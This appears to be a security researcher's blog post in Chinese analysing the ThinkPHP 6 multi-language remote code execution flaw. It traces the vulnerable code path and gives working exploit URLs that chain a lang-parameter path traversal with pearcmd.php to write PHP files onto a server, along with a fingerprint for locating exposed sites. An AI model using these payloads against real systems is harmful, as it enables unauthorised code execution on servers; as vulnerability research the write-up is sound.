@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Thinkphp6 多语言RCE" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Thinkphp6 多语言RCE
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="post-toc-text">环境搭建</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tp6%E5%AE%89%E8%A3%85"><span class="post-toc-text">tp6安装</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="post-toc-text">修改配置文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%80%BB%E7%BB%93"><span class="post-toc-text">总结</span></a></li></ol>
+            
+        
+        <blockquote>
+<p>漏洞文章:<a target="_blank" rel="noopener" href="https://tttang.com/archive/1865/">https://tttang.com/archive/1865/</a></p>
+<p>影响范围: Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</p>
+<p>fofa指纹: header&#x3D;”think_lang”</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="tp6安装"><a href="#tp6安装" class="headerlink" title="tp6安装"></a>tp6安装</h3><p>我这里是用phpstorm配合ubuntu虚拟机进行远程调试</p>
+<p>安装composer</p>
+<pre><code class="php">curl -sS https://getcomposer.org/installer | php
+mv composer.phar /usr/local/bin/composer
+chmod +x /usr/local/bin/composer
+</code></pre>
+<p>用composer安装tp6，需要php版本为7以上，所以要设置一下php版本，否则会报错</p>
+<pre><code class="bash">composer create-project --prefer-dist topthink/think=6.0.13 tp6.0.13
+</code></pre>
+<p>修改compoer.json来设置tp的版本</p>
+<pre><code class="json">    &quot;require&quot;: &#123;
+        &quot;php&quot;: &quot;&gt;=7.2.5&quot;,
+        &quot;topthink/framework&quot;: &quot;6.0.13&quot;,
+        &quot;topthink/think-orm&quot;: &quot;^2.0&quot;
+    &#125;,
+</code></pre>
+<p>最后执行命令</p>
+<pre><code class="bash">composer update
+</code></pre>
+<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>需要将多语言功能打开<code>app/middleware.php</code></p>
+<pre><code class="php">&lt;?php
+// 全局中间件定义文件
+return [
+    // 全局请求缓存
+    // \think\middleware\CheckRequestCache::class,
+    // 多语言加载
+     \think\middleware\LoadLangPack::class,
+    // Session初始化
+    // \think\middleware\SessionInit::class
+];
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251425209.png" alt="image-20240125142526010"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先去了解一下thinkphp6的基本路由，控制器，架构，看看手册就行了<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0">ThinkPHP6.0完全开发手册</a></p>
+<p>跟一些代码，找到漏洞点</p>
+<p>进入<code>\think\middleware\LoadLangPack::class</code>，在<code>handle()</code>函数打上断点</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251447699.png"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251447003.png" alt="image-20240125144755863"></p>
+<pre><code class="php">public function handle($request, Closure $next)
+&#123;
+    // 自动侦测当前语言
+    $langset = $this-&gt;detect($request);
+
+    if ($this-&gt;lang-&gt;defaultLangSet() != $langset) &#123;
+        $this-&gt;lang-&gt;switchLangSet($langset);
+    &#125;
+
+    $this-&gt;saveToCookie($this-&gt;app-&gt;cookie, $langset);
+
+    return $next($request);
+&#125;
+</code></pre>
+<p><code>middleware</code>里的类都会被调用handle函数，用来处理请求，这是tp6框架决定的。</p>
+<p>开启debug，跟进<code>detect()</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251436320.png" alt="image-20240125143627165"></p>
+<pre><code class="php">protected function detect(Request $request): string
+&#123;
+    // 自动侦测设置获取语言选择
+    $langSet = &#39;&#39;;
+
+    if ($request-&gt;get($this-&gt;config[&#39;detect_var&#39;])) &#123;
+        // url中设置了语言变量
+        $langSet = strtolower($request-&gt;get($this-&gt;config[&#39;detect_var&#39;]));
+    &#125; elseif ($request-&gt;header($this-&gt;config[&#39;header_var&#39;])) &#123;
+        // Header中设置了语言变量
+        $langSet = strtolower($request-&gt;header($this-&gt;config[&#39;header_var&#39;]));
+    &#125; elseif ($request-&gt;cookie($this-&gt;config[&#39;cookie_var&#39;])) &#123;
+        // Cookie中设置了语言变量
+        $langSet = strtolower($request-&gt;cookie($this-&gt;config[&#39;cookie_var&#39;]));
+    &#125; elseif ($request-&gt;server(&#39;HTTP_ACCEPT_LANGUAGE&#39;)) &#123;
+        // 自动侦测浏览器语言
+        $match = preg_match(&#39;/^([a-z\d\-]+)/i&#39;, $request-&gt;server(&#39;HTTP_ACCEPT_LANGUAGE&#39;), $matches);
+        if ($match) &#123;
+            $langSet = strtolower($matches[1]);
+            if (isset($this-&gt;config[&#39;accept_language&#39;][$langSet])) &#123;
+                $langSet = $this-&gt;config[&#39;accept_language&#39;][$langSet];
+            &#125;
+        &#125;
+    &#125;
+
+    if (empty($this-&gt;config[&#39;allow_lang_list&#39;]) || in_array($langSet, $this-&gt;config[&#39;allow_lang_list&#39;])) &#123;
+        // 合法的语言
+        $range = $langSet;
+        $this-&gt;lang-&gt;setLangSet($range);
+    &#125; else &#123;
+        $range = $this-&gt;lang-&gt;getLangSet();
+    &#125;
+
+    return $range;
+&#125;
+</code></pre>
+<p>这里先用<code>$request-&gt;get()</code>进行取值，<code>$this-&gt;config[&#39;detect_var&#39;]</code>的值为<code>lang</code>，那么就是取get参数lang的值，所以<code>$langSet</code>的值是可控。</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251453313.png" alt="image-20240125145302280">                       </p>
+<p>这里先给lang传参再进行调试，<code>http://192.168.91.39:8085/public/?lang=v2222</code></p>
+<p>后面运行到这里，会进行一下判断</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251455537.png" alt="image-20240125145549484"></p>
+<p>是会进入if分支的，从而将Lang类的实例里的成员<code>$lang</code>的值设置为我输入的传参<code>v2222</code>，然后返回<code>$range</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251458051.png" alt="image-20240125145819912"></p>
+<p>然后出来函数，继续走到这里，会判断当前<code>$langset</code>的值是否和默认值一样，不一样就进入if分支，很明显看到，我这里是会进入分支的</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251458700.png" alt="image-20240125145858558"></p>
+<p>跟进<code>$this-&gt;lang-&gt;switchLangSet()</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251501194.png" alt="image-20240125150115064"></p>
+<pre><code class="php">public function switchLangSet(string $langset)
+&#123;
+    if (empty($langset)) &#123;
+        return;
+    &#125;
+
+    $this-&gt;setLangSet($langset);
+
+    // 加载系统语言包
+    $this-&gt;load([
+        $this-&gt;app-&gt;getThinkPath() . &#39;lang&#39; . DIRECTORY_SEPARATOR . $langset . &#39;.php&#39;,
+    ]);
+
+    // 加载系统语言包
+    $files = glob($this-&gt;app-&gt;getAppPath() . &#39;lang&#39; . DIRECTORY_SEPARATOR . $langset . &#39;.*&#39;);
+    $this-&gt;load($files);
+
+    // 加载扩展（自定义）语言包
+    $list = $this-&gt;app-&gt;config-&gt;get(&#39;lang.extend_list&#39;, []);
+
+    if (isset($list[$langset])) &#123;
+        $this-&gt;load($list[$langset]);
+    &#125;
+&#125;
+</code></pre>
+<p>这里会加载系统语言包，这里可以知道，他加载的文件路径是可控的，可以使用目录遍历的方式，加载任意php结尾的文件</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251502062.png" alt="image-20240125150208938"></p>
+<p>跟进<code>load()</code></p>
+<pre><code class="php">public function load($file, $range = &#39;&#39;): array
+&#123;
+    $range = $range ?: $this-&gt;range;
+    if (!isset($this-&gt;lang[$range])) &#123;
+        $this-&gt;lang[$range] = [];
+    &#125;
+
+    $lang = [];
+
+    foreach ((array) $file as $name) &#123;
+        if (is_file($name)) &#123;
+            $result = $this-&gt;parse($name);
+            $lang   = array_change_key_case($result) + $lang;
+        &#125;
+    &#125;
+
+    if (!empty($lang)) &#123;
+        $this-&gt;lang[$range] = $lang + $this-&gt;lang[$range];
+    &#125;
+
+    return $this-&gt;lang[$range];
+&#125;
+</code></pre>
+<p>如果<code>$file</code>是文件，则进入<code>parse()</code>函数</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251503491.png" alt="image-20240125150334314"></p>
+<p>跟进<code>parse()</code>函数</p>
+<pre><code class="php">protected function parse(string $file): array
+&#123;
+    $type = pathinfo($file, PATHINFO_EXTENSION);
+
+    switch ($type) &#123;
+        case &#39;php&#39;:
+            $result = include $file;
+            break;
+        case &#39;yml&#39;:
+        case &#39;yaml&#39;:
+            if (function_exists(&#39;yaml_parse_file&#39;)) &#123;
+                $result = yaml_parse_file($file);
+            &#125;
+            break;
+        case &#39;json&#39;:
+            $data = file_get_contents($file);
+
+            if (false !== $data) &#123;
+                $data = json_decode($data, true);
+
+                if (json_last_error() === JSON_ERROR_NONE) &#123;
+                    $result = $data;
+                &#125;
+            &#125;
+
+            break;
+    &#125;
+
+    return isset($result) &amp;&amp; is_array($result) ? $result : [];
+&#125;
+</code></pre>
+<p>他会判断文件后缀，如果是php，那么就用include进行包含，这里就是漏洞点，利用文件包含来进行任意代码执行</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251504911.png" alt="image-20240125150450783"></p>
+<p>如果只利用这个点进行攻击，那么在实战中，就需要有任意文件上传的点，且知道上传文件的路径，才能进行包含造成RCE，同时需要关闭<code>open_basedir</code></p>
+<p>在没有任意文件上传的情况下，就需要找到环境自带的php文件，并且可以控制文件内容。这里就利用到了<code>pearcmd.php</code></p>
+<blockquote>
+<p>PEAR（PHP Extension and Application Repository）是一个PHP扩展和应用程序的仓库，提供了许多可重用的代码库和工具，以帮助PHP开发人员加快开发过程并提高代码质量。</p>
+<p>PEAR工具是用于管理和操作PEAR仓库中的代码库和工具的工具集合。其中包括一个命令行界面（CLI），允许用户执行各种操作，如安装、卸载、更新、列出可用的包等。</p>
+<p>而pearcmd.php是PEAR工具包的一部分，它是PEAR工具的命令行执行脚本，允许用户通过命令行界面来执行PEAR工具的功能，而无需直接调用PEAR库本身。</p>
+<p>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
+<p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
+</blockquote>
+<p>具体可以看：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></li>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></li>
+</ul>
+<p>可以使用命令行的方式，让pear来创建文件</p>
+<pre><code class="bash">php ../lib/php/pearcmd.php config-create &quot;/&lt;?=phpinfo();exit();?&gt;&quot; /tmp/1.php
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251606311.png" alt="image-20240125160605194"></p>
+<p>这里是用命令行的形式来创建文件，那如何通过文件包含的形式来创建文件呢</p>
+<p>pear读取参数会先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER[&#39;argv&#39;]</code>，后者我们可通过query-string控制，这里需要在php.ini设置<code>register_argc_argv=On</code></p>
+<p>关于<code>register_argc_argv</code>，可以看panda师傅的文章<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/787.html">https://www.cnpanda.net/sec/787.html</a></p>
+<p>也可以看php官方文档<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/features.commandline.differences.php">https://www.php.net/manual/en/features.commandline.differences.php</a></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251609157.png" alt="image-20240125160905109"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251609156.png" alt="image-20240125160928121"></p>
+<p>总结来说，就是开启<code>register_argc_argv</code>之后，php就会将get传参里的查询字符串，以<code>+</code>为分隔符传给<code>$_SERVER[&#39;argv&#39;]</code>数组。</p>
+<p>例如：</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+var_dump($_SERVER[&#39;argv&#39;]);
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251619625.png" alt="image-20240125161920552"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251619305.png" alt="image-20240125161943232"></p>
+<p>在文件包含pearcmd.php的时候，pearcmd.php会读取<code>$_SERVER[&#39;argv&#39;]</code>的值，然后传递给pear，来执行相关操作。这样就能在文件包含里创建文件，造成任意代码执行了。这里也需要注意，要关闭<code>open_basedir</code></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload：</p>
+<pre><code>/public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd&amp;&lt;?=phpinfo();die();?&gt;+info.php
+</code></pre>
+<p>这里最好用bp或者yakit来发包，否则浏览器会自动将<code>&lt;</code>和<code>&gt;</code>进行url编码，导致无法解析php代码</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251640478.png" alt="image-20240125164028134"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251640497.png" alt="image-20240125164035045"></p>
+<p>这里payload的写法也是有讲究的，因为这样写，对应php来说是传入了一下三个参数</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251643439.png" alt="image-20240125164317402"></p>
+<p>但是对于<code>$_SERVER[&#39;argv&#39;]</code>，则是传入了一下四个元素</p>
+<pre><code>    
+Array
+(
+    [0] =&gt; 
+    [1] =&gt; config-create
+    [2] =&gt; /&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd&amp;&lt;?=phpinfo();die();?&gt;
+    [3] =&gt; info.php
+)
+</code></pre>
+<p>转换成传入pearcmd.php的命令行格式就是</p>
+<pre><code class="bash">php pearcmd.php config-create /&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd&amp;&lt;?=phpinfo();die();?&gt; info.php
+</code></pre>
+<p>所以可以看到<code>info.php</code>里，<code>/&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd&amp;</code>字符串也存在里面</p>
+<p>在pearcmd字符被禁用的情况下，也可以使用<code>peclcmd.php</code>，他们一般在一个文件夹下</p>
+<pre><code>/public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/peclcmd&amp;&lt;?=phpinfo();die();?&gt;+info2.php
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251647618.png" alt="image-20240125164703533"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上来看，这个漏洞利用的限制还是蛮多的</p>
+<ol>
+<li><p>需要开启多语言中间件</p>
+</li>
+<li><p>需要开启<code>register_argc_argv</code>，但是根据网上的大佬测试发现</p>
+<pre><code>php的官⽅docker镜像，默认都开启了register_argc_argv
+php5.2.X版本，默认开启
+</code></pre>
+<p>而且<code>register_argc_argv</code>的可修改范围为<code>PHP_INI_PERDIR</code>，可在 php.ini，.htaccess 或 httpd.conf 中设定</p>
+</li>
+<li><p>需要有pearcmd.php</p>
+<pre><code>在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。
+
+不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php
+
+在phpstudy安装的7.4之前的php，pearcmd.php的路径为/usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd.php
+</code></pre>
+</li>
+<li><p>需要关闭<code>open_basedir</code></p>
+<p><code>register_argc_argv</code>的可修改范围为<code>PHP_INI_ALL</code>（在 PHP &lt; 5.2.3 时是 PHP_INI_SYSTEM）</p>
+</li>
+</ol>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251658042.png" alt="image-20240125165811986"></p>
+<p>限制太多了，所以略显鸡肋，而这个打法使用于很多cms，因为他主要就是利用include文件包含php文件。</p>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-01-25</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+                            代码审计
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
